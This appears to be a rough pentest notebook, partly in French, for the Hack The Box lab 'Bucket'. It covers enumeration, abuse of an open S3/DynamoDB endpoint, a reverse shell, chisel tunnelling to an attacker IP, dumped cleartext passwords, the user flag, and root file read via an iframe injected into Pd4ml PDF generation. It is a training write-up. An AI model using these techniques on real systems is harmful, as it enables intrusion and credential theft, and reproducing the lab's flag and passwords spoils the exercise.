# ENUM 

NMAP : 

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://bucket.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

http://bucket.htb [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[support@bucket.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.212], Script

EMAIL => support@bucket.htb 

[11:13:10] 403 -  275B  - /server-status  

## S3 BUCKET 

BUCKET = espace de stockage 
- URL storage bucket AWS 
=> http://s3.bucket.htb/adserver 
=> "http://s3.bucket.htb/adserver/images/cloud.png"
=> http://s3.bucket.htb/adserver

- ENUM BUCKET 

hypercorn-h11

access-control-allow-origin: *
access-control-allow-methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH

**https://cloud.hacktricks.xyz/pentesting-cloud/aws-pentesting/aws-unauthenticated-enum-access/aws-s3-unauthenticated-enum**


[11:14:32] 200 -    0B  - /shell                                           
[11:14:34] 200 -   54B  - /health  

shoudl try /shell/ 

the second shell leads to another page ! :O

URL shell redirige vers http://444af250749d:4566/shell/

http://444af250749d:4566/shell/
[11:19:36] 500 -  158B  - /shells                                           
[11:19:36] 500 -  158B  - /shell-cgi

http://s3.bucket.htb/health

http://444af250749d:4566/shell/ local ? 

444af250749d => instance 
port 4566

fichier rediriver dans le bucket 

dynamodb

/shell?nimportequoi=ls

aws acces key to access db etc..

with random access key id 
secret acces key 

NO VERIFICATION 
just verification if not empy ? 
region whatever 

access to s3bucket.htb 

/shell
/health 
open ?

mybucket is adserver

UPLOAD XSS, send to support@bucket.htb 
=> retrive smth ?


s3.bucket.htb => configuration differente, pas de moteur PHP juste stockage 


intereprete PHP 

bucket.htb => configuration avec PHP moteur, webserver dirrente 

http://bucket.htb/exploit.php


# REVERSE SHELL 

on bucket.htb
www-data => user is roy 
access ddb 4566 

region = us-east-1

# LIN PE

Server Admin webmaster@localhost

aws configure
	- region => us-east-1 
	- version => latest
	- profile => default

$ aws dynamodb list-tables --endpoint-url http://localhost:4566


$ aws --endpoint-url http://localhost:1234 dynamodb scan --table-name users | jq -r '.Items[]
restriction /var/www/aws


./chisel server -p 9001 --reverse => on kali machine
./chisel client {IP_ATTACKER}:9001 R:1234:{IP_TARGET_SERVICE}:{TARGET_PORT}

./chisel client 10.10.14.5:9001 R:1237:localhost:4566

CHISEL redireciton de port pour utiliser mon AWS

```

{
  "password": {
    "S": "Management@#1@#"
  },
  "username": {
    "S": "Mgmt"
  }
}
{
  "password": {
    "S": "Welcome123!"
  },
  "username": {
    "S": "Cloudadm"
  }
}
{
  "password": {
    "S": "n2vM-<_K_Q:.Aa2"
  },
  "username": {
    "S": "Sysadm"
  }
}
```
flag user => 2035f2038ee7845cbc7489fe3268d459

on the db website aws => Sysadm = user roy on machine =   
```"password": {
    "S": "n2vM-<_K_Q:.Aa2"
  }
```
su roy
n2vM-<_K_Q:.Aa2
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
pen.js


LPE => 
     passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");

sinon => créer une table SCAN 
$$ IDEES $$  => 

mettre randomware dedans
impacter le contenue 
utiliser un exploit de PD4CMD pour avoir root et lire /root/root.txt

soit index.php est executé par root auquel cas java sera executé par root avec ses privilèges ?

sinon trouver vuln Pd4ml_demo pour monter en privilège 

=> les fichiers appartiennet a root mais roy peut uassi les executer
droit root => x
droit groupe de root => x
droit autre => pas x 

donc si le fichier est executé c'est par un membre du groupe root 
OU 
par root 

donc droit root 



plan :
---------------------------------------------------
ajouter table ransomware
contenue de tel sorte a aller chercher file:///root/root.txt
trigger creation pdf avec POST 
action=get_alerts

et le lire dans le result ? 
------------------------------------------

POST 
action=get_alerts

=> getIterator(Scan)
tableName => alerts
filterExprewssion title 
=> Ransomware 

pourchaque item dans Ransomware 
mon item.html

java Pd4Cmd (Pdf? inject?) files/result.pdf
 entonnoir 

où est mon input ?

```
aws dynamodb create-table --table-name alerts \
--attribute-definitions AttributeName=title,AttributeType=S \
--key-schema AttributeName=title,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=1,WriteCapacityUnits=1 \
--endpoint-url http://localhost:1235 \
--cli-input-json '{ 
   "AttributeDefinitions": [ 
      { 
         "AttributeName": "title", 
         "AttributeType": "S" 
      } 
   ], 
   "KeySchema": [ 
      { 
         "AttributeName": "title", 
         "KeyType": "HASH" 
      } 
   ], 
   "ProvisionedThroughput": { 
      "ReadCapacityUnits": 1, 
      "WriteCapacityUnits": 1 
   }
}'

```
PDF  Server side  XSS? 
accès en tant que root a n'importe quel fichier !! :O
payload => <iframe src=file:///root/root.txt></iframe>

access Bucket-app ?

check in the file the PDF ? 

su roy
n2vM-<_K_Q:.Aa2
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
cd /var/www/bucket-app
curl -X "POST" -d "action=get_alerts" http://localhost:8000
python3 -m http.server 5556

!!flag!!

# DYNAMO DB 

<?php
require 'vendor/autoload.php';
date_default_timezone_set('America/New_York');
use Aws\DynamoDb\DynamoDbClient;
use Aws\DynamoDb\Exception\DynamoDbException;

$client = new Aws\Sdk([
    'profile' => 'default',
    'region'  => 'us-east-1',
    'version' => 'latest',
    'endpoint' => 'http://localhost:4566'
]);

$dynamodb = $client->createDynamoDb();

//todo
